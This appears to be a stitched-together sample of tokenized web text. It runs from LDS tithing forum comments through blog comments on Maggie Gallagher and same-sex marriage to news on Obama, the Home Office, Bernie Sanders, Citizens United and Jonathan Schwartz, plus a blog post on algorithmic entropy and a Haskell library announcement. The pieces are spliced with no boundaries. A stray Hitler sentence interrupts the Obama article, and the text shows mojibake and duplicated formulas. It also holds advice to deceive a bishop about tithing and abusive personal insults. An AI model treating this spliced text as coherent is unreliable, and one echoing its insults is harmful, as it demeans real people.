I paid tithing with appreciated stock every year .
Tax advantages are huge .
In that case they flip the stock immediately and pocket the cash .
Cool thing about donating " in-kind " as its called , is that you pay directly to SLC so your Bish has no idea how much , if any , you 've donated so he can't question your tithe - paying status at all .
Tip to True Believing Mormons who may be lurking : quit paying and tell your Bish you 've made donations of stock .
Works like a charm .
In rich wards I 've heard guys Bitch about stock going up after they donated it .
" If I 'd waited one more month I would have only had to give 1000 shares instead of 2000 . "
Cry me a river .
12/29/1999 - Randy J .
I was a clerk in three wards , and a bishop 's counselor for two years .
I handled the weekly finances and made the bank deposit for years .
In my experience , the percentage of active members as opposed to total members on the ward rolls was always about 40 % .
The percentage of full tithers among the active members seemed to be about 50 - 60 % .
That means that only about 25 - 30 % of total members are full tithers .
But since a certain percentage of full - tithers will have high incomes , each contributing $ 5,000 - $ 10,000 per year , their money makes up for the non-payers , and still makes it cost - effective for the church to justify a ward and chapel , etc .
I read somewhere that LDS chapels take in an average of six times the money needed to build and maintain them .
Those figures are actually in line with other non-profit organizations I 'm familiar with .
My wife used to be the secretary for the local Junior Chamber of Commerce , and she collected and recorded annual dues .
She found that only about 40 - 50 % of total Jaycees on the rolls actually participated in the organization , and only about 25 % paid their dues faithfully , and another 25 % lagged behind or had to be sent notices .
But the difference between the Jaycees and the Mos is that if you do n't pay , the Jaycees eventually drop you .

I dont know how many morons pay their union dues in full .
But I do know that if you work for the mafia / church you better have a reciept of your dues PAID IN FULL at the end of the year .
Or go find a soup line to hang out at .
Comment Section
All the stuff you said in your article is a bunch of lies not one thing is true .
When you said that Romney gave ten precent of his gross to Monson was not blind obedience .
Latter Day Saints ( Mormons ) give ten percent of there money to the church as tithing to build more temples and churches .
And Monson is the true and living prophet , not just some actor .
So before you talk about someones religion you should probably do some resaech on it .

Nobody is forced to pay tithing .
Keep things simple .
Things like paying 10 % , net or gross , etc. are all out there as a guideline .
Individual circumstances should always be taken to account otherwise the gospel of Jesus Christ wouldnâ€™t reconcile back to the churches tithing principles .
But letâ€™s face it , thatâ€™s not the problem , you are .
Most of you are just scared to speak up to your bishops and stake presidents .
It 's sad really , you 've all created this little support group to sit around and moan about your inability to communicate properly your feelings to the leadership of your local church without burning bridges .
Blind faith ?
I donâ€™t think so .
You just need to sit down with them and say look .
I 'm going to pay off this credit card and I 'm only going to give what I can manage for the time being to the church or you can say bishop , Iâ€™m not going to pay anymore because of this this and this .
At least be human about it .
You made a commitment when you were baptised , YOU JOINED THE CHURCH , and the least you can do is have a bit of character and self respect to deal with things like an adult .

When you look at the authority for tithing it is found in the Book of Malachi .
The Jews lived in a society that was effectively a theocracy .
The church was the state .
Tithing was a tax at 10 % and it was redistributed to help the poor .
Most people tithed their produce which was shared out with those in need .
Today in the West we pay taxes in excess of 10 % we feed the hungry and clothe the naked , we build hospitals and schools .
We all do this from our tthing or tax deductions .
I am sure God never intended us to pay another 10 % as well to self serving cults like the mormon church that does not even practice honesty by opening to public inspection it 's financial reports .
Article of faith 13 We believe in being honest .
I do n't think so .

Wow , looks like a lot of clerks that do n't understand finances !
The $ 5000 or so budget is just for extra expenses .
That usually does n't include maintenance and upkeep of the building .
Most importantly , it does n't include the cost of the building itself .
Buildings are purchased up front by tithing funds .
That means no mortgage payment .
Where does this money come from ?
It comes from the tithing funds of other faithful members in other wards .
So basically , you are just paying for more buildings just like someone else paid for yours .

Tithing is not about money .
It is a principle of faith , obedience and charity which is the pure love of Christ .
Ward clerks forget that their role is to process the paperwork and leave the judgment to the Lord .
There is no call for disdain , envy , unrighteous judgment which seem to accompany the subject of money .
Money is a tool .
Use it .
Do n't let it use you .
If you do n't want to pay tithing , do n't pay it .
Be a cheerful giver or not one at all .
Where is your love of the Lord in your offering ?
We may pay a 10 percent tithe , but remember that God graciously and generously allows us to keep 90 percent of what He provides for us .
What the church does with the 10 percent is between His servants in the church and Him .

If you do n't pay , the so called leaders try to impose guilt on you by denying you from the " blessings " of God ( Temple , etc . )
Do you have to pay to get blessed ?
Please ...
* Can somebody explain why Monson and friends have accumulated millions while being in the humble service of the Lord ?
Tip : by appointing himself to be part of board of directors of several organizations owned by Church .
So he 's full time servant of the Lord .
.
How does he find the time to be in such mundane activities ?
Does he pay tithing ?
No .
He does n't because he 's a full time general authority traveling for free getting richer off your back .
Does this make sense ???
Stop paying tithing .
More blessings will come to you if you devote that money for the college funds of your kids .
The Church does n't give a damn about you .
You are just another stat and a barcode .

I agree with Pres. Hinckley !
I do n't want my contributions being disclosed to the world .
I 'm not contibuting it for the recognition ( or condemnation ) of the world .
That 's not the purpose .
Obviously by the ammount of members faithfully paying tithing , there sure must be a pretty great reason they keep doing it .

I have found that if a person wants to they can prove or disprove just about anything and everything .
The LDS church is constantly under the microscope because people are afraid of the teachings of this Church .
The reason they fear it is because it goes against the " norm " .
It all comes down to this , either the Church is teaching the Truth or it is teaching alot of False .
If the Church 's doctrines are false , then all is well for mainstream society .
However , if the Church is indeed teaching what Our Heavenly Father wants , then mainstream society is completely off - base .
That would mean CHANGE would be necessary .
Those who wish to judge the LDS Church or its doctrines usually do so out of fear , ignorance , or the desire to excuse their own lifestyles .
Former members of the Church criticize , and try to disprove it because they are faced with their own guilt for falling into transgression .
They are trying to validate their actions .
The LDS Church did n't fail them , they just simply could n't follow its precepts .
Does that make them evil ?
NO !
Does that make the Church wrong ?
NO !
In order for a person to know the TRUTH they must search it out , and then PRAY about it .
The reason I say that is simple , HEAVENLY FATHER , JESUS CHRIST , AND THE HOLY GHOST CANNOT LIE !
They are the only people who will NEVER lead you down the wrong path .
Do you want to know if the Word of Wisdom is the truth ?
Read it and then PRAY .

Sorry to hear so many who have such strong negative feelings towards the payment of tithing .
Unfortunately , there we , as beings who rely on money not only for our needs , but our wants , have always had difficulty sacrificing certain wants .
If it were n't difficult , if everyone willingly gave without issue , tithepaying would n't be called a " sacrifice " .
I must say my own experience has been quite the opposite of those who have made comments on this website .
In my short 34 yrs , tithing , although difficult at times to pay , has always brought me closer to my God .
The divine expectation of sacrifice does tend to separate God 's children .
It always have .
History ( and modernity ) has shown that for every Abel , there are ten Cains .
Tithing , of course , is not unique to Mormonism .
Believers of many other faiths ( whose leaders , undoubtedly , skim off much more of the tithing cream , due to the fact that they do n't have their own sources of income as do most LDS leaders ) , similarly exercise a certain amount of faith , in the expectation that their sacrifice will be recognized in Heaven , and recompensed accordingly .
Will we get rich from paying tithing , as many from this website have supposed ?
Well , that depends on how you define wealth .
If wealth means one develops a closer relationship to that God who has given all , if wealth means overcoming the lust of money , if wealth means " having sufficient for your needs " ( but , mind you , not always enough for your " wants " ) , then I can attest , from personal , and countless indirect experiences , that TITHING MAKES YOU WEALTHY .
But , let 's remember not to let our left hand know what our right hand doeth ( especially when God is our judge . )
I hope I have n't given the impression that I think myself anybody special for my simple payment of tithing .
Like all of us , I have my own issues and vices .
But the payment of an honest tithe has helped me to partially overcome my own love of money , and has helped me correct certain priorities in my life .
The notion that our leaders are getting rich off our tithe is ludicrous .
The presence of temples , free literature , church property ( used for humanitarian purposes ) , and well - constructed church buildings worldwide , hint that something else is going on .
And data on incomes published to the contrary , coupled with a personal acquaintance with any such leaders , begs the honest reader not even dignify such lies with a reply .
We can , and should , deal with the honest facts of our theology re " God- making " , polygny , and the likes , but should be loathe to respond to those who would distort or spread false truths .
The notion that bankruptcy has been " caused " by the payment of an honest tithe is similarly irrational when one has a sound scriptural understanding of tithing ( although , I do not doubt that many honest tithe - payers have succombed to the easy - out of declaring bankruptcy , ignoring the more difficult but appropriate option of working themselves of their own hole , usually dug with the shovel of materialism .
Certainly , the perfectionist Mormon society that emphasizes self - reliance and avoidance of debt has , not for any fault of it's own , pushed many a member to declare bankruptcy to avoid such financial chains . )
In summary , when an individual confesses difficulty with the principle of tithing , one sheds more light on their own personal character , than do they detract from the character of the Mormon faith .
Tithing has ruined many a churchgoer 's faith ( or has evidenced their lack of faith ) , be it Mormon , Protestant , or Catholic ; it will always be a divisive practice .
Whose side are we on ?
Tithe - payers or non tithe - payers .
I suggest that this is the issue with most of the comments above ( and not , as has been supposed , Mormons or non-Mormons . )
The scriptures , and good conscience clear of worldly influence and desires , suggest we should be on the tithe - paying side .
- 12/23/2008 - Matt

Not all of the statistics presented here agree .
God knows every need , and would logically command
His servants to lead in such a way that will benefit according to the time .
Compair the Old and New Testements .
Heavenly Father acted differently in both situations .
The principles were the same , but carried out differently .
God is the same yesterday today and forever , so his methods may change to accomodate need , as He did in the Old and New Testement times .
All clergy in the mormon church is not paid .
Tithing and fast offerings go to those who have LESS money .
As said by many non -morman men and women , " Money is the root of all evil . "
Not everyone in Utah is mormon , like not everyone in Colorado is skinny .
Can you honestly judge millions of people by the mistakes or imperfections of one person ?
Lastly , I believe that people with good intentions such as yourselves should have some better business than attempting to tear down other people 's religions .
- 10/06/2007 - Whatever
_______________________________________________________________
Yes , I actually believe in The Church of Jesus Christ of Latter - day Saints and am a full tithe payer .
The way I found this site is by doing a search on " where to send tithing lds " on Yahoo .
The reason I did such a search was because in my last tithing settlement my bishop said he sends some of his own tithing directly to church headquarters so that no one person in our ward will have an accurate idea of how much money he makes .
I have some indications as to how much he makes and I have good reason to believe he has several million dollars stashed away after taxes , tithing , etc .
I was trying to find the address to send my own tithing to so that no one person in my ward will have an accurate idea how little money I make ( currently ) .
To those complaining that they have to show their bishop how much money they make then maybe you can try this solution of sending some of your tithing directly to church headquarters .
Then when tithing settlement comes and it shows only $ 150 was donated through typical ward channels you can still honestly state that you are a full tithe payer .
This * may * also explain some of the other comments here by ward secretaries who say they felt like some members were lying when they claimed to be full tithe payers .
Then again , it may not explain it but the point is that bishops are n't ( or at least should n't be ) overly analytical about dollar figures they see on the end - of - year tithing printout .
Anyways , the bankruptcy issue is irrelevant .
There 's rich Mormons and poor Mormons and everywhere - inbetween Mormons just like with non-Mormons .

Maggie Gallagher : ' I think gay marriage is more like bans on interracial marriage '
by Jeremy Hooper

Wow .
Our legal peace is akin to one of the worst civil blights of the modern era ?
That 's , uhm -- interesting .
Please , please , pleeeeease make that your organization 's next commercial message , Maggie .
For reals :

** Oh , and by the way :
On the exact same show where Maggie made these comments , Penna 's other guest , Linda Harvey , said the following about us homo - gays and our rights :

Same show .

Same booker .
Same overheated movement .
Just less of a carefully - crafted filter .
Although with Maggie starting to compare the gay community 's civil progress to historical racism , she 's certainly testing the sturdiness of said filter .

Not just getting airtime , Sunnivie .
Maggie is considered * the* voice of the anti-marriage equality movement .
She 's the one that the Bishops call in whenever they get involved in any state .
And she speaks for NOM , an organization whose founder , Robert George , was recently cited by the Times as the " reigning brain of the Christian right . "
It 's quite startling .
Equally startling is how much apathy / non - concern our community shows towards it .

It 's not discrimination to treat different things differently ?
Does she listen to herself ?
It 's frightening that so many people believe this and somehow see no correlation between the ban on interracial marriage and bans on SSM .
But of course she prefaced it did n't she : " racism is bad " .
Sorry but that was a South Park moment if ever I 've heard one .
She is a cartoon character .

Oh Christ - Maggie pulled out the " two great halves of humanity " line again .
I wish I had a copyright on that sentence so she'd have to pay me a nickel every time she said it .
Anyway , she says gay marriage would , " impose a new political ideal to an existing natural institution . "
Guess what , Maggie : in the decision that led to Loving v. Virginia , the judge used the same reasoning to defend anti-miscegenation laws : " Almighty God created the races white , black , yellow , malay and red , and he placed them on separate continents .
And but for the interference with his arrangement there would be no cause for such marriages .
The fact that he separated the races shows that he did not intend for the races to mix . "

Soooo ... that Harvey chick does n't want us to have ANY rights or legally ( secularized ) sanctioned relationships that are marriage - like ?
Then what is " marriage - like " ?
I argue that it is a stable and loving relationship that publicly portrays and repudiates the promiscuous notions of earlier eras and stabilizes those relationships in permanence ( at least at the outset , because marriages do n't always last ) ; and this Harvey - chick obviously does n't understand that , nor should she be airing her personal religious views as established facts !

Maggie is the leader of the Christofascists in America .
Her every waking moment is dedicated to hate , intolerance , and bigotry .
She 's not only a liar , a coward , and a glutton , she 's birthed a bastard child and married a Hindu and then turns around and throws stones at us .
She can't even hold herself up to a mirror without seeing the evil she wreaks on a daily basis .
Anyone who is this viscious , this mendacious , this bigotted , has serious psychological problems which she projects onto our community .
It 's a sickness in her mind and she needs psychological counseling and possibly psychotropic drugs to cure her of her Catholicism .

Ok , then !
So I guess it's ok to treat men and women differently because they are different genders .
It 's ok to treat different races differently because their skin is different colors .
It 's ok to treat different religions differently because they worship different gods .
It 's ok to treat people with red hair differently because most people have dark or blond hair .

I can almost deal with Maggie Moo's rhetoric as it's completely baseless , Harvey on the other hand seems to think the U.S. is somehow a Christian church , which it is not .
Plenty of straight people do n't follow her theological approach to politics .
The thing that makes me laugh about this , if she REALLY took the Bible literally , she would n't be talking on the radio .
After all , she 's a woman and the Bible makes several references to the fact a woman is the property of her husband and her sole purpose is to respect , serve and obey his every command .
She also demonstrates a complete lack of valid education as she does n't seem to understand how the Bible was used to prevent women from voting .
Again , if women had followed the Bible and obeyed their husbands , she would n't be voting on who does or does not get equal rights ... in fact , she'd be putting dinner on the table instead .
Posted by : James Hipps | Feb 11 , 2010 2:33:34 PM
Maggie 's key to success is her ability to rationalize bigotry , spouting a fundamentally anti-gay position and then pretending it's not based on any sort of animosity against gays .
Next time somebody tries the old " I want to ban gay marriage , but I 'm not homophobic " trick on you , tell them this :
There are more than 1,000 laws that straight couples are able to obtain in an instant with the simple signature and application fee .
But gay couples , no matter how long they 're together or how inextricable their interests are , are unable to secure these rights for themselves .
This means gay people pay higher taxes , are often unable to share health insurance with their partners , cannot sponsor foreign - national partners for immigration , have no automatic right to inherit a partner 's property in the event of sudden death , can't make medical decisions if the other partner is incapacitated , can be forced to testify against a partner in court -- the list goes on and on .
Gay couples can only obtain a fraction of the rights afforded to married couples , usually by paying enormous legal fees .
This causes measurable and quantifiable harm to gay couples and , by extension , gay people in general .
Whatever rationale you use for your position , by wanting to see this situation continue , you support a legal regime that is fundamentally and blatantly unjust , inequitable and oppressive and demonstrate that you intentionally wish to see gay people harmed or simply do n't care that we are harmed .
Either way , your position and your indifference to the suffering you cause make you an anti-gay bigot .
As for those who support civil unions or domestic partnerships , including the ones that grant all the rights of marriage , they clearly see our relationships -- and therefore us -- as inherently inferior .
So , they 're still bigots .

Exclusive : Obama Would ' Rather Be Really Good One - Term President ' Obama tells Diane Sawyer he does n't want to be a " mediocre two - term president . "
Jan. 25 , 2010  -- President Obama , buffeted by criticism of his massive health care reform bill and election setbacks , said today he remained determined to tackle health care and other big problems despite the political dangers to his presidency .
" I 'd rather be a really good one - term president than a mediocre two - term president , " he told ABC's " World News " anchor Diane Sawyer in an exclusive interview today .
Obama sat down with Sawyer two days before he will deliver a State of the Union address to a joint session of Congress , and he acknowledged the political setbacks of his first year in office .
The State of the Union will be Obama 's chance to jump - start his agenda , but he ducked when Sawyer asked if he could guarantee there would not be a tax increase for anyone making less than $ 250,000 .
" I can guarantee that the worst thing we could do would be to raise taxes when the economy is still this weak , " he replied .
Watch Diane Sawyer 's interview with President Obama on " Nightline " at 11:35 p.m. tonight , and on " Good Morning America " at 7 a.m. Tuesday
The speech this Wednesday comes at a time when the president 's health care reform bill , the centerpiece of his domestic agenda , is stalled in Congress because the Senate lost its supermajority when Massachusetts elected Republican Scott Brown last week .
Brown campaigned on a promise to vote against the bill .
The president had previously admitted the convoluted process of cobbling together the huge bill had alarmed voters but said today he would not back off of tackling large issues despite the political jeopardy involved .
" You know , there is a tendency in Washington to believe our job description , of elected officials , is to get re-elected .
That 's not our job description , " Obama said .
" Our job description is to solve problems and to help people . "
The president said he was not deterred by the problems with the health care bill .
Click here to read the full transcript of Diane Sawyer 's interview with President Obama
" I will not slow down in terms of going after the big problems that this country faces , " he said .
" The easiest thing for me to do , Diane , would be to go small bore , avoid controversy , just make sure that everybody 's comfortable and we only propose things that do n't threaten any special interests in Washington .
If you do that , then you can get a boost in the poll numbers . "
Seated across from Sawyer in the White House , the president added , " I do n't want to look back on my time here and say to myself all I was interested in was nurturing my own popularity . "
The president 's poll numbers have sagged in recent weeks as the debate over health care peaked and the economy , particularly the unemployment numbers , stubbornly resisted a quick fix .
Obama dismissed the dip in his job approval rate .
" I went through this [ in ] the campaign .
When your poll numbers drop , you are an idiot .
When your poll numbers are high , you are a genius .
If my poll numbers are low , then I am cool and cerebral , and cool and detached .
If my poll numbers are high , " Obama said with a laugh , " boy he 's calm and reasoned all right . "

The president conceded he has made mistakes , at one point saying , " I 'd probably say I make a mistake a day , maybe two . "
One of the biggest , he said , was the confusing way in which the health bill was shaped .
" I think the healthcare debate as it unfolded legitimately raised concerns not just among my opponents , but also amongst reporters that we just do n't know what 's going on , " and that some " stray cats " got in the bill , he said .
But the president insisted " I did n't make a bunch of deals …
I am happy to own up to the fact that I have not changed Congress and how it operates the way I would have liked . "
The president 's comments seem to acknowledge that the year - long fight for a health care reform bill has cost him politically .
The day after Brown won election in Masschusetts , Obama indicated that he was willing to make concessions to win passage of some form of a health care reform bill .
Within days of the Massachusetts election , he has also hired his 2008 campaign manager David Plouffe to help his administration and the Democratic Party regroup before the midterm elections later this year .
The president said the setbacks suffered by politicians in Washington are " nothing compared to the setbacks of a guy who loses his job …
He 's sending out 100 resumes and he's not getting any answers back and his wife and kids are at home and he 's thinking , am I going to be able to make sure that mortgage payments get made ?
Am I going to be able to afford to keep my health insurance ? …
They get up every day , they go out for that next interview and they keep on interviewing until they find a job .
Those are the people who inspire me . "

The White House has made it clear that during the State of the Union the president will propose measures that emerged from his Task Force on Middle Class Families .
Those measures include :
Increasing the Child and Dependent Care Tax Credit for middle class families making under $ 85,000 a year from 20 % to 35 % of qualifying expenses .
Capping student federal loan payments to 10 percent of the student 's income above a basic living allowance .
Requiring all employers to give workers an option of automatic workplace direct - deposit IRAs .
Expanding tax credits to match retirement savings by expanding and simplifying the Saver 's Credit to match 50 percent of the first $ 1,000 of contributions by families earning up to $ 65,000 and providing a partial credit to families earning up to $ 85,000 .
Expanding support for families balancing work with caring for elderly relatives with a $ 102.5 million Caregiver Initiative .
They found no evidence to support the popular British wartime song that the Fuehrer only had one testicle , that his penis was deformed after he was bitten by a goat as a youth or that his warped personality was affected much either way by his consumption of exotic substances throughout his career .

The Home Office has long had a reputation as a glittering coffin for political careers .
Many recent home secretaries have , as one of them put it to me , left the place feet first .
There have been six New Labour home secretaries in the past 13 years - three of whom were forced to go .
The Home Office was born out of the barrel of a gun .
It was created to prevent public disorder after troops shot dead nearly 300 people after rioting ... in 1780
It was known last summer , when I began making a new TV series about the Great Offices of State that the Home Office was about to have a new political master .
I had a hunch it would be Alan Johnson , whom I knew quite well .
I asked if he got the job , whether we could film him taking over .
To my agreeable surprise he agreed - but one of his special advisers told me : " We have n't been given a heads up from Number 10 .
So we are not necessarily expecting anything . "
Poisoned chalice
Of course what we now know - though we did not know then - was that Gordon Brown apparently wanted to move Alistair Darling from the Treasury to the Home Office , and make Ed Balls the Chancellor .
But " move over Darling " did n't happen , as the Chancellor dug his heels in .
And Johnson got the poisoned chalice .
As he arrived to take up his new post , we were in the basement car park of the Home Office - where the department 's top official , Sir David Normington was waiting to greet his new political master .
Michael Cockerell got unprecedented access behind the scenes in Whitehall
It had been agreed that Johnson would be dropped there to avoid the media pack waiting at the front door .
Johnson swept up in his new official armour - plated Jaguar and Special Branch bodyguard .
He was to be given the official line before he uttered publicly in his new role .
Our camera was running as he received his first briefing from the Home Office 's Head of News , Simon Wren , a bear of a man with the confidential manner of a Scotland Yard detective .
" They 're not expecting you to know anything , " were his reassuring words .
As one TV previewer observes : " It 's the real ' Thick of It ' without the swearing . "
Thus armed , Alan Johnson strode out to meet the hacks .
The former postman is not short of self - confidence , mixed with a nice line in self - irony .
Asked later by his new department 's house magazine who he would like to see play himself in any feature film of his life , Johnson replied : " George Clooney , but he would have to smarten himself up a bit . "
He was now on the front line in the most hazardous job in government .
Queen 's peace The Home Office was born out of the barrel of a gun .
It was created to prevent public disorder after troops shot dead nearly 300 people after rioting and looting on the streets of London in 1780 .
Over two centuries later , keeping the Queen 's peace remains the Home Office 's Number one priority .
As well as Alan Johnson and his Sir Humphrey , Sir David Normington , I interviewed many previous home secretaries and their top mandarins .
Our aim was to capture the DNA and culture of the Home Office .
Its job is to fight crime and terrorism and control immigration .
Life at the Home Office for its officials and ministers is always filled with jeopardy partly because as one former home secretary John Reid put it : " You have n't got the ideal client list . "
And as another former Home Secretary wrote in a memo to his Sir Humphrey 50 years ago : " Poor old Home Office , we do n't always get it wrong .
But we always get the blame . "
Michael Cockerell uncovers the secret world of the Home Office , Foreign Office and Treasury in Great Offices of State on BBC Four at 9 pm on Thursdays from 11th February , repeated Mondays at 8 pm and afterwards on BBC iPlayer

Wednesday , Senator Bernie Sanders became the first to introduce a universal health care bill on the floor of the Senate .
( see above video )
While he eventually withdrew the bill after Republican delaying tactics , my hat is off to the Independent Senator from Vermont .
He has always stood up for the people of his state and the country and he has big brass ones !
Now , Bernie has said that he will not vote for the current bill .
More from The Hill :
Sen. Bernie Sanders ( I - Vt. ) said late Wednesday that he cannot support the Democrats ' healthcare reform legislation in its current form .
Asked by Fox Business Network 's Neil Cavuto asked Sanders if he could support the compromise bill .
The senator replied " I ’m struggling with this .
As of this point I am not voting for the bill .
And here ’s why . "
Sanders , who favors a single - payer healthcare system , said that he has informed the White House and Democratic leadership of his position .
" As of this moment .
I am going to do my best to make this bill a better bill , a bill that I can vote for but I ’ve indicated both to the White House and the Democratic leadership that my vote is not secure at this point , " he said .
Sanders words come as Democratic leaders are now facing heat from the left over several compromises made in order to attract centrist votes .
Read on ...
Hooray for Bernie !
Any notion that killing the public option or the Medicare buy in provision is a " centrist " idea is ridiculous -- it is a far right position , and one that lies well outside the mainstream of America and the Democratic Party platform .
Holy Joe Lieberman has been shoving his mug in front of every camera he can find to gloat about how much power he wields in this debate , so I am thrilled to see Sanders step up to the plate and make it known that not everybody on Capitol Hill is going to roll over for the insurance lobby .
Mike Stay and I would love comments on this paper :
We got into writing this because Mike has worked a lot on algorithmic information theory .
Gregory Chaitin has described this subject as “ the result of putting Shannon ’s information theory and Turing ’s computability theory into a cocktail shaker and shaking vigorously . ”
In particular , this theory has revealed a deep link between ‘ algorithmic entropy ’ and the notion of entropy used in information theory and thermodynamics .
The algorithmic entropy of a string of bits is a measure of much information that string contains .
It ’s a bit subtler than the length of the shortest program that does the job .
But it ’s close : the difference between these is bounded by a constant .
Anyway , the idea is that a random string like this :
1010001011010111010010010101101110101000101010000101110 1010001011010111010010010101101110101000101010000101110
has more algorithmic entropy than one with a simple pattern , like this :
0000000000000000000000000000000000000000000000000000000 0000000000000000000000000000000000000000000000000000000
On the other hand , in thermodynamics we define the Gibbs entropy of a probability measure p p on a countable set X X to be
S ( p ) = − ∑ x ∈ X p ( x ) ln p ( x ) S( p ) = - \ sum_{x \in X} p( x ) \ln p( x )
If we think of X X as a set of possible outcomes of an experiment , the entropy says how much information we gain — on average — by learning the result of the experiment , if beforehand all we knew was that each outcome x x happened with probability p ( x ) p( x ) .
If the set of outcomes is a set of bit strings , or some other set of ‘ signals ’ , Gibbs entropy has another name : Shannon entropy .
Gibbs was interested in chemistry and steam engines .
Shannon was interested in communication , and measuring the amount of information in a signal .
But the math is the same .
This is a great story in itself !
If you do n’t know this story , try the links .
On the other hand , algorithmic entropy seems really different .
Why ?
Both algorithmic entropy and Shannon entropy can be used to measure the amount of information in bit strings .
But algorithmic entropy can measure the information in a single bit string , while Shannon entropy applies only to probability measures on bit strings .
Nonetheless , there are deep relationships between these two kinds of entropy .
So , when I started talking about thermodynamics as part of a big set of analogies between different theories of physics in week289 , Mike naturally wondered if algorithmic information theory should become part of this story .
And that ’s how this paper was born !
Here ’s the idea :
Abstract : Algorithmic entropy can be seen as a special case of entropy as studied in statistical mechanics .
This viewpoint allows us to apply many techniques developed for use in thermodynamics to the subject of algorithmic information theory .
In particular , suppose we fix a universal prefix - free Turing machine and let X X be the set of programs that halt for this machine .
Then we can regard X X as a set of ‘ microstates ’ , and treat any function on X X as an ‘ observable ’ .
For any collection of observables , we can study the Gibbs ensemble that maximizes entropy subject to constraints on expected values of these observables .
We illustrate this by taking the log runtime , length , and output of a program as observables analogous to the energy E E , volume V V and number of molecules N N in a container of gas .
The conjugate variables of these observables allow us to define quantities which we call the ‘ algorithmic temperature ’
T T , ‘ algorithmic pressure ’ P P and ‘ algorithmic potential ’ μ \mu , since they are analogous to the temperature , pressure and chemical potential .
We derive an analogue of the fundamental thermodynamic relation d E = T d S − P d V + μ d N , d E = T d S - P d V + \mu d N , and use it to study thermodynamic cycles analogous to those for heat engines .
We also investigate the values of T , P T , P and μ \mu for which the partition function converges .
At some points on the boundary of this domain of convergence , the partition function becomes uncomputable .
Indeed , at these points the partition function itself has nontrivial algorithmic entropy .
As the first sentence hints , one of the fun things we noticed is that algorithmic entropy is a special case of Gibbs entropy — but only if we generalize a bit and use relative entropy .
They say “ everything is relative ” .
I do n’t know if that ’s true , but it ’s sure true for entropy .
Here ’s the entropy of the probability measure p p relative to the probability measure q q :
S ( p , q ) = − ∑ x ∈ X p ( x ) ln ( p ( x ) q ( x ) ) S ( p , q ) = - \ sum_{x \ in X} p( x ) \ln \ left ( \frac{p ( x ) }{q ( x ) }\right )
This says how much information we gain when we learn that the outcomes of an experiment are distributed according to p p , if beforehand we had thought they were distributed according to q q .
Another fun thing about this paper is how it turns around an old idea of Charles Babbage .
His Analytical Engine was a theoretical design for computer powered by a steam engine .
We describe a theoretical design for a heat engine powered by programs !

[ Haskell - cafe ] ANN : atom - 1.0.0
Atom is a Haskell DSL for designing hard realtime embedded software .
The 1.0 release is meant to indicate some level of stability ; most of the core has been unchanged for quite some time .
That said , there are a few interesting changes in 1.0 .
First the var ' family of variable declarations ( bool ' , word8 ' , double ' , etc. ) are no longer part of the Atom monad .
For example : bool ' :: Name -> V Bool
This cleaned up quite a bit of code in our production design .
This also made the randomization in Atom 's unit testing framework monadless as well .
The other significant change with 1.0 is all state variables are now packed into a hierarchical C structure that matches the hierarchy of the Atom design .
Not only does this make the generated C a bit more legible , it is now possible to interface external C code directly to Atom 's state variables and arrays .
Prior to this change , all interfacing had to be done through var ' declarations and action calls -- too often a messy process .
To further aid interfacing to external code , Atom now generates a header file that exposes both the iterative function and the hierarchical state structure .

Editor 's note : Jeffrey Toobin is a CNN senior legal analyst and a staff writer at The New Yorker .
A former assistant U.S. attorney , Toobin is the author of several critically acclaimed best - sellers , including " The Nine : Inside the Secret World of the Supreme Court " and " Too Close to Call : The 36 - Day Battle to Decide the 2000 Election . "
New York ( CNN ) --
It was the most vivid , and unexpected , confrontation of Wednesday 's State of the Union address .
It happened when President Obama said this : " Last week , the Supreme Court reversed a century of law to open the floodgates for special interests -- including foreign corporations -- to spend without limit in our elections . "
In the audience , Justice Samuel Alito , President Bush 's second appointee to the Supreme Court , could be seen shaking his head and saying , it appeared , " Not true , not true . "
Who 's right ?
As for what the court decided in Citizens United v. FEC , Obama seems to be right -- mostly .
In a 5 - 4 decision , written by Justice Anthony Kennedy and joined by Alito , the court held that corporations , labor unions and other organizations had the right under the First Amendment to spend unlimited amounts of money to influence the outcomes of elections .
If a corporation now wants to saturate the airwaves for or against any candidate for office , including on the eve of the election , it now has the Supreme Court 's say - so to do it .
Obama was on shakier ground when he said foreign companies now had the same unlimited rights to participate in our elections .
The court 's opinion very carefully said it was not deciding the issue with regard to foreign entities .
So the court may yet give the green light to these foreign companies -- but it has n't done so yet .
On the larger question of whether Alito should have expressed himself in this restrained but unmistakable way , I 'm with the justice .
Attending the State of the Union has always been an awkward duty for the justices -- sitting through these political addresses and wondering when it 's appropriate to applaud or react .
Gloves come off after Obama rips ruling
When the president is paying tribute to the armed forces , or making an otherwise uncontroversial point , the justices usually join in the clapping ; when the point is more political -- like the one Obama made about Citizens United on Wednesday -- the tradition is for the justices not to react .
But it 's wise to remember that the justices are human beings , with strong views on many subjects , including their own decisions .
When Obama was criticizing the court 's work ( as was his right ) , Alito had the right to react the way anyone would who had taken a shot in a high - profile setting .
In my book , even a Supreme Court justice -- even at the State of the Union -- is entitled to grimace and mutter .
( It is worth noting that Alito does seem to have an ax to grind with Obama .
As a senator , Obama voted against Alito 's confirmation , which the justice does not seem to have forgotten .
When the President - elect Obama made a courtesy call on the justices shortly before his inauguration last year , Alito was the only member of the court not to attend . )
Still , it 's worth remembering who is likely to have the last word in this confrontation .
In his speech , Obama went on to say about the court 's opinion , " Well , I do n't think American elections should be bankrolled by America 's most powerful interests , or worse , by foreign entities .
They should be decided by the American people , and that 's why I 'm urging Democrats and Republicans to pass a bill that helps to right this wrong . "
The president and the Congress can try -- but it is the court that will have the last word on evaluating whether any new law is constitutional .
And Alito , who is 59 years old with life tenure , will likely be passing on the validity of laws long after Obama has left office .
As Justice Robert Jackson said of the court many years ago , " We are not final because we are infallible , but we are infallible only because we are final . "
The opinions expressed in this commentary are solely those of Jeffrey Toobin .
As expected , former Sun Microsystems CEO Jonathan Schwartz confirmed that he is leaving the venerable server and software company now that it ’s been acquired by Oracle .
Perhaps less expected , Schwartz made the announcement late Wednesday night in the form of a haiku , via Twitter :
“ Today ’s my last day at Sun . I ’ll miss it .
Seems only fitting to end on a # haiku , ” read the brief message from Schwartz , who uses the Twitter moniker OpenJonathan .
“ Financial crisis / Stalled too many customers / CEO no more . ”
Schwartz , 44 , has not said what he plans to do , although there has been speculation he might join a software startup or venture capital firm .
The longtime software executive succeeded Sun cofounder Scott McNealy as CEO in 2006 .
While at Sun , Schwartz led the company ’s embrace of open - source software , pursuing a strategy of releasing the source code to many of its programs , in the hope that customers would become familiar with them and then purchase maintenance contracts and Sun hardware .
Schwartz also sought to cultivate an iconoclastic reputation , wearing his hair in a ponytail and writing extensively about his views and corporate strategy in a company blog .
But Schwartz was not able to turn around Sun ’s struggling business , as many customers turned to lower - cost commodity hardware and other vendors found ways to operate more efficiently .
